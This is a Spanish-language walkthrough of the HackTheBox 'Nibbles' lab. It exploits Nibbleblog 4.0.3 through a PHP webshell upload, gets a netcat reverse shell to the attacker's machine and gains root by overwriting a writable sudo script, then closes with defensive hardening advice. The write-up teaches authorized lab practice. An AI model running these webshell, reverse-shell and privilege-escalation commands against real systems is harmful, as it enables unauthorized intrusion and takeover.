---
title: Nibbles (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, linux, cms, file-upload, rce, sudo-privesc, nibbleblog]
type: nota
status: en-progreso
source: claude-code
aliases: [Nibbles, HTB Nibbles, nibbles-htb]
---

# Nibbles — HackTheBox (Easy)

**SO:** Linux · **Dificultad:** Easy · **Skills:** enumeración web, fuerza bruta ligera de credenciales, file upload vulnerable (CVE-2015-6967), RCE via webshell PHP, escalada de privilegios por sudo + script escribible.

Esta máquina ilustra una cadena muy común en entornos reales: CMS desactualizado con credenciales débiles → subida de archivo malicioso → shell como usuario → script sudo mal configurado → root. El salto respecto a Starting Point es que aquí la cadena tiene **tres eslabones** (descubrimiento → foothold → privesc) y ninguno viene dado: hay que enumerar, adivinar y encadenar.

> HTB es un laboratorio de ciberseguridad 100 % legal y autorizado. Practicar aquí es ético y formativo.

---

## Objetivo

Obtener acceso a la máquina como el usuario `nibbler` (flag `user.txt`) y escalar a `root` (flag `root.txt`) explotando una instalación vulnerable de Nibbleblog 4.0.3.

---

## Acceso a la máquina (paso previo)

1. **Conectarse a la VPN de HTB** — abre una terminal y déjala abierta durante toda la sesión:
   ```bash
   sudo openvpn lab_<tu_usuario>.ovpn
   ```
2. **Lanzar la máquina** — en la web de HTB, busca "Nibbles" en la sección de máquinas retiradas (requiere suscripción VIP) y pulsa *Spawn Machine*. HTB te asignará una IP dinámica del rango `10.10.10.x`.
3. **Verificar conectividad:**
   ```bash
   ping -c2 <IP>
   ```
4. A lo largo de este writeup, `<IP>` representa esa IP dinámica. Sustitúyela por la que te toque. Si usas el **Pwnbox** (Kali en el navegador), ya viene conectado a la VPN.

---

## Reconocimiento

**Categoría:** escaneo de puertos y detección de servicios.

```bash
nmap -sC -sV -oN nibbles.nmap <IP>
```

Resultado relevante:
- Puerto **22** — SSH (OpenSSH, Linux)
- Puerto **80** — HTTP (Apache httpd)

Solo hay dos superficies de ataque. Empezamos por HTTP.

```bash
curl -s http://<IP>/
```

La respuesta parece una página en blanco con solo "Hello world!". Pero si revisas el código fuente:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

El comentario delata la ruta del CMS. Esta pista es suficiente para continuar; un atacante real la habría encontrado igualmente con gobuster.

> Truco: siempre revisa el código fuente (`Ctrl+U` o `curl -s | grep -i comment`). Los desarrolladores dejan comentarios que nunca deberían llegar a producción.

---

## Enumeración

**Categoría:** fingerprinting de CMS y descubrimiento de rutas.

```bash
gobuster dir -u http://<IP>/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
```

Rutas clave encontradas:
- `/nibbleblog/admin.php` — panel de administración
- `/nibbleblog/content/` — directorio listable con archivos subidos
- `/nibbleblog/README` — confirma versión: **Nibbleblog 4.0.3**

```bash
curl http://<IP>/nibbleblog/README
```

La versión exacta es crítica: permite buscar CVEs concretos.

```bash
searchsploit nibbleblog
```

Resultado:
```
Nibbleblog 4.0.3 - Arbitrary File Upload (Authenticated)  | php/webapps/38489.txt
```

El exploit requiere autenticación. Hay que entrar al panel antes.

**Panel de administración** — `http://<IP>/nibbleblog/admin.php`

No hay registro público. La solución estándar en esta máquina es **credential guessing**: el usuario es `admin` y la contraseña es `nibbles` (relacionada con el nombre de la máquina/hostname). No hay fuerza bruta masiva porque Nibbleblog bloquea IPs tras varios intentos fallidos; hay que pensar antes de disparar.

> Patrón de ataque: cuando un CMS expone panel de login, prueba siempre credenciales por defecto y variantes del hostname/nombre del servicio antes de lanzar wordlists. En auditorías reales, esto aparece constantemente.

---

## Acceso inicial (foothold)

**Categoría:** CVE-2015-6967 — Nibbleblog 4.0.3 Arbitrary File Upload (Authenticated).

**Qué hace el exploit:** el plugin "My image" de Nibbleblog permite subir imágenes al servidor pero no valida la extensión del archivo en el servidor (solo en el cliente). Se puede subir un archivo `.php` que el servidor Apache ejecutará directamente, obteniendo RCE.

**Pasos:**

1. **Acceder al panel** con `admin` / `nibbles`.

2. **Activar el plugin My image:** `Plugins → My image → Activate`.

3. **Preparar la webshell:**
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   ```

4. **Subir `shell.php`** desde `Plugins → My image → Configure → Upload image`. Ignorar los errores de validación del lado cliente (cambiar extensión o interceptar con Burp si es necesario).

5. **Localizar el archivo subido.** Nibbleblog guarda los archivos del plugin en una ruta predecible:
   ```
   http://<IP>/nibbleblog/content/private/plugins/my_image/image.php
   ```

6. **Verificar RCE:**
   ```bash
   curl "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
   ```
   Respuesta esperada: `uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)`

7. **Obtener reverse shell.** En tu máquina, escucha:
   ```bash
   nc -lvnp 4444
   ```
   Luego lanza la shell (URL-encode los caracteres especiales si es necesario):
   ```bash
   curl "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+<TU_IP>+4444+>/tmp/f"
   ```
   Ya tienes shell como `nibbler`.

8. **Estabilizar la shell:**
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
   ```

> Nota: la ruta exacta del archivo subido puede variar ligeramente entre versiones del plugin. Si no responde, enumera `content/private/plugins/` con `curl` o desde la shell.

---

## Escalada de privilegios

**Categoría:** sudo misconfiguration — script ejecutable con sudo y escribible por el usuario.

**Paso 1: enumerar permisos sudo.**

```bash
sudo -l
```

Salida:
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` puede ejecutar ese script como root sin contraseña. Pero antes de lanzarlo, comprueba si el archivo existe y si puedes escribirlo:

```bash
ls -la /home/nibbler/personal/stuff/monitor.sh
```

Es posible que el directorio `personal/` esté comprimido en un zip. En ese caso:

```bash
ls /home/nibbler/
# Si hay personal.zip:
unzip /home/nibbler/personal.zip -d /home/nibbler/
```

**Paso 2: comprobar permisos de escritura.**

```bash
ls -la /home/nibbler/personal/stuff/monitor.sh
```

El archivo pertenece a `nibbler` → podemos sobreescribirlo.

**Paso 3: reemplazar el script con una shell.**

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

O directamente una línea:

```bash
echo -e '#!/bin/bash\nbash -i' > /home/nibbler/personal/stuff/monitor.sh
```

**Paso 4: ejecutar como root.**

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Shell de root. Comprueba:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| Flag | Ubicación | Cómo obtenerla |
|------|-----------|----------------|
| `user.txt` | `/home/nibbler/user.txt` | Con shell como `nibbler` |
| `root.txt` | `/root/root.txt` | Con shell como `root` |

```bash
# Como nibbler:
cat /home/nibbler/user.txt
# <flag>

# Como root:
cat /root/root.txt
# <flag>
```

---

## Patron y teoria

Esta sección es la más importante si tu objetivo es aprender a diseñar y defender, no solo a atacar.

### Patron 1: CMS desactualizado + credenciales débiles + upload sin validación → RCE

**Esquema de la cadena:**
```
Comentario HTML (leak de ruta)
  → CMS identificado por versión (README expuesto)
    → CVE-2015-6967: file upload sin validación server-side
      → webshell PHP ejecutada por Apache
        → RCE como usuario del proceso web (nibbler)
```

**Por qué funciona:** la validación de tipo de archivo solo se hacía en el cliente (JavaScript). El servidor aceptaba cualquier extensión. Apache servía el archivo como PHP ejecutable porque estaba dentro del document root.

**Como desarrollador/defensor:**
- **Validar en servidor, siempre.** La validación client-side es UX, no seguridad.
- **Whitelist de extensiones** permitidas (`.jpg`, `.png`, `.gif`) — nunca blacklist.
- **Guardar uploads fuera del document root** o en un directorio sin ejecución (`php_admin_flag engine off` en Apache, `location` con `deny` en Nginx).
- **Renombrar archivos subidos** con UUID aleatorio; nunca conservar la extensión original del cliente.
- **Actualizar dependencias y CMS.** Nibbleblog 4.0.3 tiene CVE público desde 2015.
- **No exponer `README`, `CHANGELOG` ni rutas de administración** sin autenticación en HTTP. Usa `.htaccess` o reglas de Nginx para restringir `/admin.php`.
- **Credenciales por defecto:** obliga a cambiarlas en el primer login. Aplica política de contraseñas mínima.

### Patron 2: sudo a script escribible por el usuario → escalada trivial a root

**Esquema:**
```
sudo -l → script en home del usuario con NOPASSWD
  → script escribible por nibbler
    → sobreescribir con bash -i
      → sudo ejecuta bash como root
```

**Por qué funciona:** `sudo` concede el privilegio de ejecutar el *archivo en esa ruta*, pero no controla el *contenido* de ese archivo. Si el usuario puede modificarlo, puede inyectar lo que quiera.

**Como desarrollador/defensor (hardening de sudo):**
- **Nunca apuntar `sudo` a scripts en el home del usuario.** El home es propiedad del usuario → puede sobrescribir el script.
- **Apunta `sudo` solo a binarios del sistema** (rutas en `/usr/bin/`, `/usr/sbin/`) con permisos `root:root 755`.
- **Usa `sudoedit`** cuando necesites que el usuario edite archivos de configuración — nunca `sudo vim /etc/X` (permite escape a shell).
- **Principio de mínimo privilegio:** si `monitor.sh` solo necesita leer logs, ejecútalo con un usuario dedicado de baja privilegio, no como root.
- **Audita `sudo -l`** en todos tus servidores regularmente. Herramientas como `lynis` o `linPEAS` lo detectan automáticamente.

### Salto respecto a Starting Point

En las máquinas de Starting Point la cadena es directa (un solo vector). Nibbles introduce:
1. **Reconocimiento activo necesario** (el leak de ruta no es obvio).
2. **Credential guessing** antes de explotar el CVE.
3. **Dos eslabones de explotación** encadenados (foothold + privesc independiente).
4. **Gestión de la shell** (estabilización, manejo del zip).

Este es el patrón de la mayoría de máquinas Easy reales: cadena de 2-3 pasos, cada uno requiere enumerar antes de actuar.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
